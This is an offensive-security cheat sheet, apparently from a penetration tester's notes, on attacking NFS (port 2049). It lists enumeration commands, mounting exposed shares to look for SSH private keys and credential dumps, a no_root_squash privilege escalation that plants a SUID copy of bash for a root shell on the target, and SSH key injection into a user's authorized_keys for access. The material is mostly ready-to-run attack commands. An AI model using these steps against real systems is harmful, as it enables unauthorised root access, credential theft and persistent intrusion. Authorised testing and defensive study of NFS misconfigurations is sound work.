# NFS (2049)

!!! tip "Start here"
    List exports without credentials: `showmount -e $IP`. If shares are listed, mount and browse immediately. Look for `no_root_squash` in `/etc/exports`, if present, you can write a SUID binary as root from your attacker machine and execute it on the target for privilege escalation.

---

## Enumeration

```bash
sudo nmap -sV -p 111,2049 --script "nfs*" $IP
showmount -e $IP
```

`showmount` queries the separate mount service and may return nothing on an NFSv4-only server. Use the Nmap results and attempt only known or discovered export paths rather than treating an empty `showmount` response as proof that no exports exist.

---

## Mounting Shares

```bash
mkdir /mnt/nfs
sudo mount -t nfs $IP:/share /mnt/nfs
ls -la /mnt/nfs
```

Look for:
- `/home/user/.ssh/id_rsa`
- Config files with credentials
- Database dumps

---

## no_root_squash Privilege Escalation

Check the NFS config on the target:

```bash
cat /etc/exports
```

If a share has `no_root_squash`, files created as local root retain root ownership on the server. One validation path is to place a SUID-capable binary in a location that the target mounts and can execute:

```bash
# On attacker (as root)
cp /bin/bash /mnt/nfs/suid_bash
chown root:root /mnt/nfs/suid_bash
chmod 4755 /mnt/nfs/suid_bash
```

Then on the target:

```bash
/mnt/nfs/suid_bash -p
id
```

This requires a compatible binary architecture and a target mount that does not use `nosuid` or `noexec`. Remove `suid_bash` after validation.

---

## SSH Key Injection

If a `.ssh` directory is accessible via the mount:

```bash
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/home/user/.ssh/authorized_keys
ssh user@$IP
```
